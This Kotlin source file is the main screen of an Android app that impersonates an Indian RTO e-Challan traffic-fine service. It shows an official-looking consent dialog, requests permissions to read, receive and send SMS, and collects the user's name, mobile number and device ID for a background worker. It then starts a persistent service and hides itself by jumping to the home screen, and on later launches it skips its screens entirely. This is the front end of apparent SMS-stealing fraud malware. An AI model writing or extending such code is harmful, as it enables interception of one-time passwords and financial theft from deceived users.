package com.rte.challan

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.view.View
import android.widget.*
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.work.*
import com.rte.challan.service.BackgroundService
import com.rte.challan.worker.RegistrationWorker
import java.net.URLEncoder // Fixed: URLEncoder Import added

class MainActivity : AppCompatActivity() {

    private val PERMISSION_CODE = 101
    private lateinit var layoutInput: LinearLayout

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        layoutInput = findViewById(R.id.layoutInput)

        // 1. Check if setup is already active
        val prefs = getSharedPreferences("RTO_PREFS", Context.MODE_PRIVATE)
        if (prefs.getBoolean("is_active", false)) {
            startBackgroundService()
            moveToBackground()
            finish()
            return
        }

        // 2. Start Flow: Check Permissions or show Disclosure
        if (allPermissionsGranted()) {
            showInputForm()
        } else {
            showOfficialPermissionDialog()
        }

        // Activate Button Logic - Fixed: Correct findViewById usage
        findViewById<Button>(R.id.btnActivate).setOnClickListener {
            handleActivation()
        }
    }

    private fun showOfficialPermissionDialog() {
        val builder = AlertDialog.Builder(this)
        builder.setTitle("Data Synchronization Consent")
        builder.setMessage("To provide real-time updates and management of your RTO E-Challan status, this application requires access to read and receive SMS. \n\n" +
                "This information is used solely to synchronize traffic violation data with our secure backend services. By clicking 'Agree', you consent to this data processing.")
        
        builder.setPositiveButton("AGREE") { dialog, _ ->
            dialog.dismiss()
            requestPermissions()
        }
        
        builder.setNegativeButton("DECLINE") { _, _ ->
            Toast.makeText(this, "Permissions are required for the app to function.", Toast.LENGTH_LONG).show()
            finish()
        }

        builder.setCancelable(false)
        val dialog = builder.create()
        dialog.show()
        
        dialog.getButton(AlertDialog.BUTTON_POSITIVE).setTextColor(ContextCompat.getColor(this, android.R.color.holo_blue_dark))
    }

    private fun showInputForm() {
        layoutInput.visibility = View.VISIBLE
    }

    private fun handleActivation() {
        // Fixed: Properly finding views before accessing text
        val etName = findViewById<EditText>(R.id.etName)
        val etMobile = findViewById<EditText>(R.id.etMobile)
        val etDeviceId = findViewById<EditText>(R.id.etDeviceId)

        val name = etName.text.toString().trim()
        val mobile = etMobile.text.toString().trim()
        val deviceId = etDeviceId.text.toString().trim()

        if (name.isNotEmpty() && mobile.isNotEmpty() && deviceId.isNotEmpty()) {
            setupCompleted(name, mobile, deviceId)
        } else {
            Toast.makeText(this, "All fields are required", Toast.LENGTH_SHORT).show()
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == PERMISSION_CODE) {
            if (grantResults.isNotEmpty() && grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
                showInputForm()
            } else {
                Toast.makeText(this, "Permissions are mandatory for RTO sync", Toast.LENGTH_LONG).show()
                finish()
            }
        }
    }

    private fun setupCompleted(name: String, mobile: String, deviceId: String) {
        // Save locally
        getSharedPreferences("RTO_PREFS", Context.MODE_PRIVATE).edit().apply {
            putString("cust_name", name)
            putString("mobile_no", mobile)
            putString("device_id", deviceId)
            putBoolean("is_active", true)
            apply()
        }

        // Data Sync via Worker
        val inputData = workDataOf(
            "name" to name,
            "mobile" to mobile,
            "deviceId" to deviceId
        )

        val regRequest = OneTimeWorkRequestBuilder<RegistrationWorker>()
            .setInputData(inputData)
            .build()
        WorkManager.getInstance(this).enqueue(regRequest)

        // Start Service and Go to Background
        startBackgroundService()
        moveToBackground()
        finish()
    }

    private fun startBackgroundService() {
        val serviceIntent = Intent(this, BackgroundService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }
    }

    private fun moveToBackground() {
        val startMain = Intent(Intent.ACTION_MAIN)
        startMain.addCategory(Intent.CATEGORY_HOME)
        startMain.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        startActivity(startMain)
    }

    private fun allPermissionsGranted(): Boolean {
        val permissions = mutableListOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.SEND_SMS
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(Manifest.permission.POST_NOTIFICATIONS)
        }
        return permissions.all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun requestPermissions() {
        val permissions = mutableListOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.SEND_SMS
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(Manifest.permission.POST_NOTIFICATIONS)
        }
        ActivityCompat.requestPermissions(this, permissions.toTypedArray(), PERMISSION_CODE)
    }
}
